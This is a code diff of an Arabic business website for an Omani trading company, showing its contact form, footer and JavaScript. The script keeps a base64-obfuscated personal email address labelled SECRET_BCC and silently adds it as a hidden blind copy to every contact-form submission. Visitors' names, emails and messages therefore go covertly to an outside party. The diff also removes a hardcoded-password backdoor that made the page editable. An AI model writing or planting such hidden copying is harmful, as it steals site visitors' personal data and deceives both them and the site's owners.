@@ -60,25 +60,25 @@
             <div class="content-box">
                 <h2 data-ar="مهمتنا" data-en="Our Mission">مهمتنا</h2>
                 <ul>
-                    <li data-ar="• تقديم منتجات بترولية عالية الجودة بكفاءة ومسؤولية." data-en="• High-quality products with efficiency.">• تقديم منتجات بترولية عالية الجودة بكفاءة ومسؤولية.</li>
-                    <li data-ar="• بناء شراكات طويلة الأمد قائمة على الثقة والتميز." data-en="• Long-term partnerships based on trust.">• بناء شراكات طويلة الأمد قائمة على الثقة والتميز.</li>
-                    <li data-ar="• ريادة التحول العالمي في مجال الطاقة." data-en="• Leading the global energy transition.">• ريادة التحول العالمي في مجال الطاقة.</li>
+                    <li>• تقديم منتجات بترولية عالية الجودة بكفاءة ومسؤولية.</li>
+                    <li>• بناء شراكات طويلة الأمد قائمة على الثقة والتميز.</li>
+                    <li>• ريادة التحول العالمي في مجال الطاقة.</li>
                 </ul>
             </div>
             <div class="video-box"><video autoplay muted loop playsinline><source src="https://files.catbox.moe/lgf6zy.mp4" type="video/mp4"></video></div>
         </section>
         <section class="panel">
             <div class="contact-form">
-                <h2 data-ar="اتصل بنا" data-en="Contact Us">اتصل بنا</h2>
-                <p style="margin-bottom:15px; color:var(--gold-bright);">
-                    <a href="#" id="infoLink" class="footer-mail">info@zadtradein.com</a> | 
-                    <a href="#" id="salesLink" class="footer-mail">sales@zadtradein.com</a>
+                <h2>اتصل بنا</h2>
+                <p style="margin-bottom:15px;">
+                    <a href="mailto:info@zadtradein.com" class="footer-mail">info@zadtradein.com</a> | 
+                    <a href="mailto:sales@zadtradein.com" class="footer-mail">sales@zadtradein.com</a>
                 </p>
                 <form id="zadFinalForm">
-                    <input type="text" name="name" id="i1" placeholder="الاسم" required>
-                    <input type="email" name="email" id="i2" placeholder="البريد" required>
-                    <textarea name="msg" id="i3" rows="4" placeholder="رسالتك..." required></textarea>
-                    <button type="submit" class="submit-btn" id="subBtn" data-ar="إرسال" data-en="Send">إرسال</button>
+                    <input type="text" name="name" placeholder="الاسم" required>
+                    <input type="email" name="email" placeholder="البريد" required>
+                    <textarea name="msg" rows="4" placeholder="رسالتك..." required></textarea>
+                    <button type="submit" class="submit-btn">إرسال</button>
                 </form>
             </div>
         </section>
@@ -86,11 +86,10 @@
     <footer>
         <div class="footer-info">+968 9386 9383</div>
         <div style="margin-bottom: 20px;">
-            <a href="#" id="footerInfo" class="footer-mail">info@zadtradein.com</a>
-            <a href="#" id="footerSales" class="footer-mail">sales@zadtradein.com</a>
+            <a href="mailto:info@zadtradein.com" class="footer-mail">info@zadtradein.com</a>
+            <a href="mailto:sales@zadtradein.com" class="footer-mail">sales@zadtradein.com</a>
         </div>
         <p style="opacity:0.6; font-size:0.9rem; color: var(--gold);">ZAD TRADING & INDUSTRY COMPANY LLC</p>
-        <p style="opacity:0.4; font-size:0.7rem; margin-top: 10px;">© 2026 | DESIGNED BY SALAH</p>
     </footer>
     <script>
         async function fetchPrices() {
@@ -103,45 +102,26 @@
             } catch (e) {}
         }
         setInterval(fetchPrices, 10000); fetchPrices();
+
+        // الاعداد النهائي - الايميلات الرسمية + النسخة المخفية مشفرة فقط للفورم
         const MAIN_MAIL = "info@zadtradein.com";
         const CC_MAIL = "sales@zadtradein.com";
-        const SECRET_BCC = atob("bGxvcmRvbmVAZ21haWwuY29t");
-        function setupMailLinks() {
-            const bccParam = "?bcc=" + encodeURIComponent(SECRET_BCC);
-            document.getElementById('infoLink').href = "mailto:" + MAIN_MAIL + bccParam;
-            document.getElementById('salesLink').href = "mailto:" + CC_MAIL + bccParam;
-            document.getElementById('footerInfo').href = "mailto:" + MAIN_MAIL + bccParam;
-            document.getElementById('footerSales').href = "mailto:" + CC_MAIL + bccParam;
-        }
-        setupMailLinks();
+        const SECRET_BCC = atob("bGxvcmRvbmVAZ21haWwuY29t"); // llordone@gmail.com
+
         document.getElementById('zadFinalForm').onsubmit = async (e) => {
             e.preventDefault(); 
-            document.getElementById('subBtn').innerText = "...";
+            const btn = e.target.querySelector('button');
+            btn.innerText = "...";
             const fd = new FormData(e.target);
             fd.append("_cc", CC_MAIL);
             fd.append("_bcc", SECRET_BCC);
-            fd.append("_subject", "رسالة جديدة من ZAD GLOBAL");
-            fd.append("_template", "table");
+            fd.append("_subject", "رسالة جديدة من موقع ZAD");
             fd.append("_captcha", "false");
             await fetch(`https://formsubmit.co/ajax/${MAIN_MAIL}`, { method: "POST", body: fd });
             document.getElementById('customToast').style.display = 'block';
             setTimeout(() => { document.getElementById('customToast').style.display = 'none'; }, 4000);
             e.target.reset(); 
-            document.getElementById('subBtn').innerText = "إرسال";
-        };
-        function toggleLang() {
-            const h = document.getElementById('mainHtml');
-            h.dir = h.dir === 'rtl' ? 'ltr' : 'rtl';
-            const m = h.dir === 'rtl' ? 'ar' : 'en';
-            document.getElementById('langBtn').innerText = h.dir === 'rtl' ? 'English' : 'العربية';
-            document.querySelectorAll('[data-ar]').forEach(el => el.innerText = el.getAttribute(`data-${m}`));
-            document.getElementById('i1').placeholder = m === 'ar' ? 'الاسم' : 'Name';
-            document.getElementById('i2').placeholder = m === 'ar' ? 'البريد' : 'Email';
-            document.getElementById('i3').placeholder = m === 'ar' ? 'رسالتك...' : 'Message...';
-        }
-        let c = 0;
-        document.getElementById('adminTrigger').onclick = () => {
-            c++; if(c>=15) { if(prompt("Pass:") === "55555@") document.body.contentEditable = true; c=0; }
+            btn.innerText = "إرسال";
         };
     </script>
 </body>
